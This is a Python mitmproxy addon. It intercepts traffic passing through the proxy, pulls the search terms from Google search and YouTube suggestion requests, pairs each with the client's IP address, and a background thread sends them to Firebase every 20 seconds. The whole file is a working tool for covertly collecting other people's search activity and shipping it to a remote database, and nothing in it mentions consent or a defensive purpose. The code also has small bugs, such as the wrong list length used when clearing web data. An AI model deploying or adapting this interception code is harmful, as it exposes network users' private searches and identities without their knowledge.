from mitmproxy import http
from mitmproxy.utils import strutils
from threading import Thread
import re, json, sys, threading, time, signal, os
sys.path.append('../')
from connect import sendDataToFire

# A common dictionary for storing data on firebase
data = {
    "google" : [],
    "youtube" : [],
    "web" : []  
}


def request (flow: http.HTTPFlow) -> None:
    global data
    if flow.request.pretty_host ==  "www.google.co.in" and flow.request.method == 'GET':
        if flow.request.url[25:32] == "search?" and flow.request.method == 'GET' :
            ip = flow.client_conn.address[0]    # get the ip address for the query
            data["google"].append((ip,dict(flow.request.query)['q']))    # append the (ip, query) to lis
    elif flow.request.pretty_host == "suggestqueries.google.com" and flow.request.method == 'GET':
        if (flow.request.url[43:50] == "search?" and flow.request.method == 'GET'):
            ip = flow.client_conn.address[0]    # get the ip address for the query
            data["youtube"].append((ip, flow.request.query['q']))
    else:
        #data["web"].append(flow.request.host)
        pass
    #print(dict(flow.request.headers)['user-agent'])
    print(flow.request.pretty_host)

def clear_data(data, from_str):
    len_g = len(data["google"])
    len_y = len(data["youtube"])
    len_w = len(data["web"])
    if from_str == "Google":
        data["google"] = data["google"][len_g:]
        return True
    elif from_str == "YouTube":
        data["youtube"] = data["youtube"][len_y:]
        return True
    elif from_str == "Web":
        data["web"] = data["web"][len_y:]
        return True
    else:
        return False

def send_to_fire():
    while True:
        try:
            if(len(data["google"])== 0 and len(data["youtube"]) == 0 and len(data["web"]) == 0):
                time.sleep(5)
            if(len(data["google"]) > 0):
                sendDataToFire("Google", data["google"])
                clear_data(data, "Google")
            if(len(data["youtube"])>0):
                sendDataToFire("YouTube", data["youtube"])
                clear_data(data, "YouTube")
            if(len(data["web"])>0):
                sendDataToFire("Web", data["web"])
                clear_data(data, "Web")
            time.sleep(20)
        except:
            raise Exception
    pass



# start a new thread
Thread(target = send_to_fire).start()
